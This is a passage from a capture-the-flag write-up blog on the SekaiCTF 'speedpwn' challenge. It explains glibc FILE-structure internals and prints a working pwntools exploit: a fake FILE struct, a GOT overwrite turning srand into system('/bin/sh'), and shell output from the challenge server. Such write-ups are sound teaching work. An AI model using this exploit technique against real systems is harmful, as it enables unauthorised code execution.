<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">_IO_UNDERFLOW</span><span class="mtk1"> (fp);</span>
<span class="mtk1">}</span>
</code></pre></div><p>And in the end, it will call <code>IO_UNDERFLOW</code>, a macro that will call <a target="_blank" href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L461"><code>_IO_new_file_underflow</code></a> (to find this function, I needed to use a disassembler for <code>libc-2.39.so</code> and GDB, until I found the correct function name):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span>
<span class="mtk8">_IO_new_file_underflow</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk9 mtki">fp</span><span class="mtk1">)</span>
<span class="mtk1">{</span>
<span class="mtk1">  </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> count;</span>

<span class="mtk3">  /* C99 requires EOF to be "sticky".  */</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_flags </span><span class="mtk5">&amp;</span><span class="mtk1"> _IO_EOF_SEEN)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> EOF;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_flags </span><span class="mtk5">&amp;</span><span class="mtk1"> _IO_NO_READS)</span>
<span class="mtk1">    {</span>
<span class="mtk3">      /* ... */</span>
<span class="mtk1">    }</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_IO_read_ptr </span><span class="mtk5">&lt;</span><span class="mtk1"> fp-&gt;_IO_read_end)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) fp-&gt;_IO_read_ptr;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_IO_buf_base </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)</span>
<span class="mtk1">    {</span>
<span class="mtk3">      /* ... */</span>
<span class="mtk1">    }</span>

<span class="mtk3">  /* FIXME This can/should be moved to genops ?? *</span><span class="mtk3">/</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_flags </span><span class="mtk5">&amp;</span><span class="mtk1"> (_IO_LINE_BUF</span><span class="mtk5">|</span><span class="mtk1">_IO_UNBUFFERED))</span>
<span class="mtk1">    {</span>
<span class="mtk3">      /* ... */</span>
<span class="mtk1">    }</span>

<span class="mtk1">  </span><span class="mtk8">_IO_switch_to_get_mode</span><span class="mtk1"> (fp);</span>

<span class="mtk3">  /* This is very tricky. We have to adjust those</span>
<span class="mtk3">     pointers before we call _IO_SYSREAD () since</span>
<span class="mtk3">     we may longjump () out while waiting for</span>
<span class="mtk3">     input. Those pointers may be screwed up. H.J.</span><span class="mtk3"> */</span>
<span class="mtk1">  fp-&gt;_IO_read_base </span><span class="mtk5">=</span><span class="mtk1"> fp-&gt;_IO_read_ptr </span><span class="mtk5">=</span><span class="mtk1"> fp-&gt;_IO_buf_base;</span>
<span class="mtk1">  fp-&gt;_IO_read_end </span><span class="mtk5">=</span><span class="mtk1"> fp-&gt;_IO_buf_base;</span>
<span class="mtk1">  fp-&gt;_IO_write_base </span><span class="mtk5">=</span><span class="mtk1"> fp-&gt;_IO_write_ptr </span><span class="mtk5">=</span><span class="mtk1"> fp-&gt;_IO_write_end</span>  
<span class="mtk1">    </span><span class="mtk5">=</span><span class="mtk1"> fp-&gt;_IO_buf_base;</span>

<span class="mtk1">  count </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">_IO_SYSREAD</span><span class="mtk1"> (fp, fp-&gt;_IO_buf_base,</span>
<span class="mtk1">                       fp-&gt;_IO_buf_end </span><span class="mtk5">-</span><span class="mtk1"> fp-&gt;_IO_buf_base);</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (count </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    {</span>
<span class="mtk3">      /* ... */</span>
<span class="mtk1">    }</span>
<span class="mtk1">  fp-&gt;_IO_read_end </span><span class="mtk5">+=</span><span class="mtk1"> count;</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (count </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    {</span>
<span class="mtk3">      /* ... */</span>
<span class="mtk1">    }</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_offset </span><span class="mtk5">!=</span><span class="mtk1"> _IO_pos_BAD)</span>
<span class="mtk1">    </span><span class="mtk8">_IO_pos_adjust</span><span class="mtk1"> (fp-&gt;_offset, count);</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) fp-&gt;_IO_read_ptr;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Here, if we set <code>fp->_flags</code> accordingly, we will be able to call <code>_IO_SYSREAD(fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base)</code>, which is a simple <code>syscall</code> instruction that gives us the write primitive.</p><p>Also notice that <code>_IO_file_xsgetn</code> will continue the <code>while</code> loop and the <code>FILE</code> structure will have <code>fp->_IO_read_end</code> and <code>fp->_IO_read_ptr</code> updated. In the end this means that the <code>8</code> bytes (<code>want</code>) specified in <code>fread</code> will be written to <code>seed</code> from <code>fp->_IO_read_ptr</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">size_t</span>
<span class="mtk8">_IO_file_xsgetn</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk9 mtki">fp</span><span class="mtk1">, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">n</span><span class="mtk1">)</span>
<span class="mtk1">{</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> want, have;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> count;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">s </span><span class="mtk5">=</span><span class="mtk1"> data;</span>

<span class="mtk1">  want </span><span class="mtk5">=</span><span class="mtk1"> n;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_IO_buf_base </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)</span>
<span class="mtk1">    {</span>
<span class="mtk3">      /* ... */</span>
<span class="mtk1">    }</span>

<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (want </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    {</span>
<span class="mtk1">      have </span><span class="mtk5">=</span><span class="mtk1"> fp-&gt;_IO_read_end </span><span class="mtk5">-</span><span class="mtk1"> fp-&gt;_IO_read_ptr;</span>  
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (want </span><span class="mtk5">&lt;=</span><span class="mtk1"> have)</span>
<span class="mtk1">        {</span>
<span class="mtk1">          </span><span class="mtk8">memcpy</span><span class="mtk1"> (s, fp-&gt;_IO_read_ptr, want);</span>
<span class="mtk1">          fp-&gt;_IO_read_ptr </span><span class="mtk5">+=</span><span class="mtk1"> want;</span>
<span class="mtk1">          want </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">      </span><span class="mtk5">else</span>
<span class="mtk1">        {</span>
<span class="mtk3">          /* ... */</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> n </span><span class="mtk5">-</span><span class="mtk1"> want;</span>
<span class="mtk1">}</span>
</code></pre></div><p>We will use this fake <code>FILE</code> structure as a payload:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">fp</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">flat</span><span class="mtk1">([</span>
<span class="mtk1">    </span><span class="mtk7 mtki">0x</span><span class="mtk6">fbad2000</span><span class="mtk1">,                    </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk6">0</span><span class="mtk1">,                             </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk6">0</span><span class="mtk1">,                             </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk6">0</span><span class="mtk1">,                             </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.fread,</span>
<span class="mtk1">    </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.fread </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">),  </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk6">0</span><span class="mtk1">,                             </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk6">0</span><span class="mtk1">,                             </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_2_1_stderr_</span><span class="mtk1">,</span>  
<span class="mtk1">    </span><span class="mtk6">0</span><span class="mtk1">,                             </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk6">0</span><span class="mtk1">,                             </span><span class="mtk1">target</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">e0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk7 mtki">0x</span><span class="mtk6">ffffffffffffffff</span><span class="mtk1">,            </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">target</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">f0</span><span class="mtk1">,                 </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk6">0</span><span class="mtk1">,                             </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk7 mtki">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">,                    </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk6">0</span><span class="mtk1">,                             </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_file_jumps</span><span class="mtk1">,</span>
<span class="mtk1">])</span>
</code></pre></div><p>Relevant fields are:</p><ul><li><code>fp->_flags</code></li><li><code>fp->_IO_buf_base</code></li><li><code>fp->_IO_buf_end</code></li><li><code>fp->_fileno</code></li></ul><p>The rest can be left as they were initially (some Glibc and binary addresses might be needed). Actually, we can just overwrite up to <code>fp->_fileno</code>, since the rest will not be modified, but I leave that for the sake of clarity, although the exploit will take more time to finish.</p><h3 id="exploit-strategy">Exploit strategy</h3><p>Since we have an arbitrary write primitive and the binary has Partial RELRO, we will perform a GOT overwrite. The best option is to make <code>srand</code> be <code>system</code>, so that <code>reseed</code> executes <code>system("/bin/sh")</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">reseed</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bot reseeded!"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">fread</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">seed</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk1">seed_generator</span><span class="mtk1">);</span>  
<span class="mtk1">    </span><span class="mtk8">srand</span><span class="mtk1">(</span><span class="mtk1">seed</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>However, recall that the <code>fread</code> is still performed, so <code>seed</code> is still filled with 8 bytes taken from <code>fp->_IO_read_ptr</code>. This is the GOT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>got
<span class="code-dark-cyan">----------------------------------------------------------- PLT / GOT - /tmp/chall - Partial RELRO -----------------------------------------------------------</span>  
<span class="code-blue">Name              | PLT            | GOT            | GOT value     </span>
<span class="code-dark-cyan">------------------------------------------------------------------------- .rela.dyn -------------------------------------------------------------------------</span>
__libc_start_main | Not found      | 0x000000403fd8 | <span class="code-dark-green">0x7f3bdcf9d200 &lt;__libc_start_main&gt;</span>
__gmon_start__    | Not found      | 0x000000403fe0 | <span class="code-dark-green">0x000000000000</span>
<span class="code-dark-cyan">------------------------------------------------------------------------- .rela.plt -------------------------------------------------------------------------</span>
puts              | Not found      | <span class="code-dark-green">0x000000404000</span> | <span class="code-dark-green">0x7f3bdcffabd0 &lt;puts&gt;</span>
fread             | Not found      | <span class="code-dark-green">0x000000404008</span> | <span class="code-dark-green">0x7f3bdcff93f0 &lt;fread&gt;</span>
__stack_chk_fail  | Not found      | <span class="code-dark-green">0x000000404010</span> | <span class="code-dark-yellow">0x000000401050 &lt;.plt+0x30&gt;</span>
printf            | Not found      | <span class="code-dark-green">0x000000404018</span> | <span class="code-dark-green">0x7f3bdcfd30f0 &lt;printf&gt;</span>
srand             | Not found      | <span class="code-dark-green">0x000000404020</span> | <span class="code-dark-green">0x7f3bdcfbd0f0 &lt;srandom&gt;</span>
setvbuf           | Not found      | <span class="code-dark-green">0x000000404028</span> | <span class="code-dark-green">0x7f3bdcffb540 &lt;setvbuf&gt;</span>
fopen             | Not found      | <span class="code-dark-green">0x000000404030</span> | <span class="code-dark-green">0x7f3bdcff8e50 &lt;fopen64&gt;</span>
__isoc99_scanf    | Not found      | <span class="code-dark-green">0x000000404038</span> | <span class="code-dark-green">0x7f3bdcfd2e00 &lt;__isoc99_scanf&gt;</span>
getc              | Not found      | <span class="code-dark-green">0x000000404040</span> | <span class="code-dark-green">0x7f3bdd001f60 &lt;getc&gt;</span>
rand              | Not found      | <span class="code-dark-green">0x000000404048</span> | <span class="code-dark-green">0x7f3bdcfbd090 &lt;rand&gt;</span>
</code></pre></div><p>And this was the working payload:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">404088</span><span class="mtk1">)          </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.__stack_chk_fail) </span><span class="mtk5">+</span><span class="mtk1"> \</span>  
<span class="mtk1">          </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.printf)  </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system)           </span><span class="mtk5">+</span><span class="mtk1"> \</span>
<span class="mtk1">          </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.setvbuf) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.fopen)            </span><span class="mtk5">+</span><span class="mtk1"> \</span>
<span class="mtk1">          </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.scanf)   </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.getc)             </span><span class="mtk5">+</span><span class="mtk1"> \</span>
<span class="mtk1">          </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.rand)    </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk5">+</span><span class="mtk1"> \</span>
<span class="mtk1">          </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)                 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_2_1_stdout_</span><span class="mtk1">)  </span><span class="mtk5">+</span><span class="mtk1"> \</span>
<span class="mtk1">          </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)                 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_2_1_stdin_</span><span class="mtk1">)   </span><span class="mtk5">+</span><span class="mtk1"> \</span>
<span class="mtk1">          </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)                 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">p64</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk5">+</span><span class="mtk1"> \</span>
<span class="mtk1">          </span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span>
</code></pre></div><p>Basically, <code>seed</code> will contain <code>0x404088</code>, and at <code>0x404088</code> we will find <code>"/bin/sh\0"</code>. Moreover, the GOT entry for <code>srand</code> will be <code>system</code>. The rest are untouched, except for <code>fread</code> (set to <code>0x404088</code>, but doesn&rsquo;t matter).</p><p>This payload is sent when <code>fread</code> uses our fake <code>FILE</code> structure, because <code>fp->_fileno</code> is set to <code>0</code> (<code>stdin</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'r'</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Bot reseeded!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Right after sending the payload, <code>fread</code> will modify the GOT and the function <code>reseed</code> will execute <code>system("/bin/sh")</code> afterwards, so we will have a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './chall'
    Arch:       amd64-64-little
    RELRO:      <span class="code-dark-yellow">Partial RELRO</span>
    Stack:      <span class="code-dark-green">Canary found</span>
    NX:         <span class="code-dark-green">NX enabled</span>
    PIE:        <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:    <span class="code-dark-red">b'.'</span>
    SHSTK:      <span class="code-dark-green">Enabled</span>
    IBT:        <span class="code-dark-green">Enabled</span>
    Stripped:   <span class="code-dark-red">No</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 2217831  
[<span class="code-green">+</span>] Glibc base address: 0x7f863880f000
[<span class="code-green">+</span>] Writing FILE struct: Done
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> whoami
rocky
</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s try in the remote instance:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> speedpwn.chals.sekai.team 1337
[<span class="code-blue">*</span>] './chall'
    Arch:       amd64-64-little
    RELRO:      <span class="code-dark-yellow">Partial RELRO</span>
    Stack:      <span class="code-dark-green">Canary found</span>
    NX:         <span class="code-dark-green">NX enabled</span>
    PIE:        <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:    <span class="code-dark-red">b'.'</span>
    SHSTK:      <span class="code-dark-green">Enabled</span>
    IBT:        <span class="code-dark-green">Enabled</span>
    Stripped:   <span class="code-dark-red">No</span>
[<span class="code-green">+</span>] Opening connection to speedpwn.chals.sekai.team on port 1337: Done  
[<span class="code-green">+</span>] Glibc base address: 0x7f08c3fc2000
[<span class="code-green">+</span>] Writing FILE struct: Done
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
chall
flag.txt
ld-2.39.so
libc-2.39.so
<span class="code-red">$</span> cat flag.txt
SEKAI{congratz_you_beat_the_bot_and_hopefully_got_the_bounty!_1dee87}
</code></pre></div><p>The full exploit can be found in here: <a target="_blank" href="https://github.com/7Rocky/CTF-scripts/tree/main/SekaiCTF/speedpwn/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a></li><li><a href="#setup-environment">Setup environment</a></li><li><a href="#debugging-with-gdb">Debugging with GDB</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#file-structure-attack"><code>FILE</code> structure attack</a></li><li><a href="#diving-into-the-file-structure-attack">Diving into the <code>FILE</code> structure attack</a></li><li><a href="#exploit-strategy">Exploit strategy</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>